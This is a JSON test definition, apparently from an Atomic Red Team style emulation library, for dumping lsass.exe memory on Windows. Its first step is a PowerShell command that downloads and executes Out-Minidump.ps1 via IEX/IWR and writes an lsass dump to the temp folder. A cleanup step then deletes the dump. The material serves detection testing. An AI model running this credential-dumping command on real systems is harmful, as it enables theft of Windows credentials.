{
  "id": "6502c8f0-b775-4dbd-9193-1298f56b6781",
  "name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
  "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "3e1ea032-97f4-4051-b5f7-b8d296f8c08d",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "7f01140d-bf41-41cb-ac1c-17a66e0e33a9",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "3e1ea032-97f4-4051-b5f7-b8d296f8c08d",
      "p": "on-success",
      "o": "7f01140d-bf41-41cb-ac1c-17a66e0e33a9"
    },
    {
      "s": "3e1ea032-97f4-4051-b5f7-b8d296f8c08d",
      "p": "on-failure",
      "o": "7f01140d-bf41-41cb-ac1c-17a66e0e33a9"
    }
  ],
  "tags": [
    "T1003.001",
    "atomic-red-team"
  ]
}